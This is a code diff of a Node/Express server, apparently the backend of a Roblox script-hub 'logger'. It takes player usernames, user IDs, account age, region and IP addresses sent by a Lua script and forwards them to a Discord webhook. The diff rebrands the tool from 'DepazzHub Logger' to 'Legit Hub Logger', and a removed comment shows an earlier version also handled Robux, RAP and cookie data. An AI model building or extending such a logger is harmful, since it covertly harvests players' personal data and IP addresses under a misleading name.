@@ -5,20 +5,19 @@ const port = process.env.PORT || 3000;
 
 app.use(express.json());
 
-const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1234567890/yourwebhookurl";
+// Reemplaza con tu URL de webhook de Discord real
+const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI";
 
 app.post('/log', async (req, res) => {
     try {
-        // Recibimos los datos que envía el script de Lua
         const { username, displayName, userId, gameId, accountAge, region, ip } = req.body;
-
         const clientIP = ip || req.ip || req.connection.remoteAddress || 'N/A';
 
-        // Construimos el embed de Discord SIN la parte de Robux/RAP/Cookie
+        // 65484 es el código decimal para el color Hex #00FFCC (Verde Cian)
         const payload = {
-            content: "🚀 **DepazzHub Logger**",
+            content: "⚔️ **Legit Hub Logger**",
             embeds: [{
-                color: 3887359,
+                color: 65484, 
                 fields: [
                     { name: "👤 Username", value: username || "Unknown", inline: true },
                     { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
@@ -28,7 +27,7 @@ app.post('/log', async (req, res) => {
                     { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
                     { name: "🌐 Game ID", value: String(gameId || "N/A"), inline: false }
                 ],
-                footer: { text: "DepazzHub Logger" },
+                footer: { text: "Legit Hub System" },
                 timestamp: new Date().toISOString()
             }]
         };
@@ -42,5 +41,5 @@ app.post('/log', async (req, res) => {
 });
 
 app.listen(port, () => {
-    console.log(`Servidor corriendo en puerto ${port}`);
+    console.log(`⚔️ Legit Hub Server corriendo en puerto ${port}`);
 });
